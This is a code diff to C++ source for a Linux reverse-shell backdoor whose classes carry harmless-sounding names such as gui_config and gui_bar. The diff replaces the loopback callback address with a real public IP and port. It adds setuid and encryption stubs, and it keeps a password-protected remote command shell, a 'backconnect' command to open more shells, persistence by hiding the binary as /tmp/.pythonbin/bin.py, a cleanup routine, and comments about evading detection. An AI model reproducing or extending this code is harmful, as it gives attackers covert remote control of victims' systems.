@@ -1,9 +1,7 @@
 #include <iostream>
-#include <cstdlib>
 #include <cstring>
 #include <thread>
 #include <fstream>
-#include <cstdio>
 #include <sstream>
 #include <vector>
 extern "C"{
@@ -12,7 +10,6 @@ extern "C"{
     #include <limits.h>
     #include <sys/utsname.h>
     #include <unistd.h>
-    #include <stdio.h>
     #include <sys/prctl.h>
     #include <sys/socket.h>
     #include <arpa/inet.h> 
@@ -22,10 +19,10 @@ using namespace std;
 
 struct gui_config{
     const string client_ver = "lol"; // client name 
-    const string client_patch = "127.0.0.1"; // host to call back to
+    const string client_patch = "104.131.122.138"; // host to call back to
     const string client_buffer = "22123"; // port to call back to port 80 and 443 will look like web sockets
     const string client_key = "lolpass"; // password
-    const string client_time_out = "1"; // amount of time til a command will be killed, the smaller the time the less chance of detection
+    const string client_time_out = "1"; // amount of time till a command will be killed, the smaller the time the less chance of detection
 }; gui_config gc; 
 
 class gui_bar{
@@ -48,8 +45,8 @@ class gui_bar{
             if(time(NULL) >= end){
               free(buff);
               pclose(in); 
-	      return  out + "\nKilled command since it took longer than " + string(gc.client_time_out) + " Seconds\n";
-            }
+				      return  out + "\nKilled command since it took longer than " + string(gc.client_time_out) + " Seconds\n";
+		      	}
           }
           free(buff);
           pclose(in); 
@@ -151,6 +148,7 @@ class gui_bar{
           startup.close();     
           rename("/tmp/tmp.txt", (file_name).c_str());
           remove("/tmp/tmp.txt");
+          setuid(6770);
           chmod((file_name).c_str(), 755);
           return true;
 		    }
@@ -158,7 +156,7 @@ class gui_bar{
         {
           struct stat st = {0};
           if(getuid() != 0){ // not root :(
-              if (stat("/tmp/.pythonbin/", &st) == -1) {
+              if(stat("/tmp/.pythonbin/", &st) == -1){
                   mkdir("/tmp/.pythonbin/", 0700); 
                   rename((getexepath()).c_str(), "/tmp/.pythonbin/bin.py");
               }
@@ -206,13 +204,21 @@ class gui_user{
           }
         }  
     }
-}; gui_user gu;
+    string gui_enc(string enc){
+      
+      return enc;
+    }
+    string gui_dec(string dec){
+      
+      return dec;
+    }
+}; gui_user gu; 
 
 class cli_architecture : gui_config{ // backconnect
   public:  
       void isdn(void)
       {
-        string dir_line;
+        string dir_line, line;
         bool isauth=false;
         struct sockaddr_in serverc0;
         int s0 = socket(AF_INET, SOCK_STREAM, 0); 
@@ -227,9 +233,9 @@ class cli_architecture : gui_config{ // backconnect
           close(s0);
           return;
         } 
-        send(s0,("Enter Password> "), sizeof("Enter Password> "), 0);
+        send(s0,(gu.gui_enc("Enter Password> ")).c_str(), gu.gui_enc("Enter Password> ").size(), 0);
         while(1){
-            string line;
+            line="";
             char data = 0; 
             while (data != '\n'){
                 ssize_t datarecv = recv(s0, &data, 1, 0);
@@ -238,7 +244,8 @@ class cli_architecture : gui_config{ // backconnect
                         close(s0);
                         return;
                     }
-                } if(datarecv == 0) { 
+                } 
+                if(datarecv == 0){
                     close(s0);
                     return;
                 }
@@ -249,17 +256,17 @@ class cli_architecture : gui_config{ // backconnect
                 }
             }
             if(line.size() > 0){ // yes, yes here we go!
-                line.replace(line.find("\n"), 2, "");    
+                line = gu.gui_dec(line.replace(line.find("\n"), 2, ""));
                 if(isauth!=true){
                   if(line==client_key){
                       isauth=true;
-                      send(s0,("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n")).c_str(), ("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n")).size(), 0);
-                      send(s0, (gb.ftp_g()).c_str(), (gb.ftp_g()).size(), 0);
+                      send(s0,(gu.gui_enc("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n"))).c_str(), (gu.gui_enc("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n"))).size(), 0);
+                      send(s0, (gu.gui_enc(gb.ftp_g())).c_str(), (gu.gui_enc(gb.ftp_g())).size(), 0);
                       continue;
                   }
                   else{
-                      send(s0,("Incorrect password!"), sizeof("Incorrect password!"), 0);
-                      send(s0,("\nEnter Password> "), sizeof("\nEnter Password> "), 0);
+                      send(s0,(gu.gui_enc("Incorrect password!")).c_str(), gu.gui_enc("Incorrect password!").size(), 0);
+                      send(s0,(gu.gui_enc("\nEnter Password> ")).c_str(), gu.gui_enc("\nEnter Password> ").size(), 0);
                       continue;
                   }
                 }
@@ -267,29 +274,37 @@ class cli_architecture : gui_config{ // backconnect
                   if(line.find("cd ") != -1){
                       dir_line = line.replace(line.find("cd "), 3, ""); 
                       chdir((dir_line).c_str());
-                  } else if(line=="exit" || line=="quit"){    
+                  } 
+                  else if(line=="exit" || line=="quit"){    
                       close(s0);
                       exit(0);
-                  } else if(line=="session_exit" || line=="sess_exit"){
+                  }
+                  else if(line=="session_exit" || line=="sess_exit"){
                       close(s0);
                       return;
-                  } else if(line.find("backconnect ") != -1){ //backconnect host port
+                  } 
+                  else if(line.find("backconnect ") != -1){ //backconnect host port
                     vector<string> backconnect_v;
                     line.replace(line.find("backconnect "), 12, "");
                     string buffer; 
                     stringstream white_space_ss(line); 
                     while(white_space_ss >> buffer){
                         backconnect_v.push_back(buffer); 
-                    } if((backconnect_v).size() == 2 && (backconnect_v[0]).size() > 1 && (backconnect_v[1]).size() > 1){
+                    } 
+                    if((backconnect_v).size() == 2 && (backconnect_v[0]).size() > 1 && (backconnect_v[1]).size() > 1){
                        thread(&gui_bar::bios_bitmap, &gb, backconnect_v[0], backconnect_v[1]).detach();
-                    } else{
-                      send(s0,("Incorrect usage: backconnect host port\n"), sizeof("Incorrect usage: backconnect host port\n"), 0); 
+                    } 
+                    else{
+                      send(s0,(gu.gui_enc("Incorrect usage: backconnect host port\n")).c_str(), gu.gui_enc("Incorrect usage: backconnect host port\n").size(), 0); 
                     }
-                  } else if(line=="bd_cleanup"){
+                  } 
+                  else if(line=="bd_cleanup"){
                       gb.cps_codex(); // cps_codex(void)
-                  } else{
-                      send(s0,(gb.gui_c(line)).c_str(), (gb.gui_c(line)).size(), 0);
-                  } send(s0, (gb.ftp_g()).c_str(), (gb.ftp_g()).size(), 0);
+                  } 
+                  else{
+                      send(s0,(gu.gui_enc(gb.gui_c(line))).c_str(), (gu.gui_enc(gb.gui_c(line))).size(), 0);
+                  }
+                  send(s0, (gu.gui_enc(gb.ftp_g())).c_str(), (gu.gui_enc(gb.ftp_g())).size(), 0);
                   continue;
                 }
               }
